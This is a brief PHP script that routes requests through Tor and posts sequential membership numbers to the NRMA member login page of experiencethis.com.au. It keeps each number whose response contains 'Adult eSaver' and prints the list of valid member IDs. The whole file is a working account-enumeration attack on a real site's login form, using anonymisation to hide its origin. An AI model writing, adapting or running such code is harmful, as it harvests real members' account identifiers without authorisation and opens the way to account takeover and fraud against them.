<?php
require_once __DIR__ . '/../../../bootstrap.php';

$crawler = new Crawler();
$crawler->setUseTor();
$ids = array();
// up to 9407465
for ($i = 9407385; $i < 9407395; $i++) {
  $crawler->setCookiePath(CACHE_DIR . DS . 'nrma_cookie.txt');
  $crawler->clearCookie();
  $crawler->setReferer('https://www.experiencethis.com.au/mynrma/login');
  // login first
  $result = $crawler->post('https://www.experiencethis.com.au/mynrma/login', array(
      "tf_membernumber" => $i
  ));
  if (strpos($result, 'Adult eSaver')) {
    $ids[] = $i;
  }
}
foreach ($ids as $id) {
  echo "&nbsp;&nbsp;- $id<br />";
}
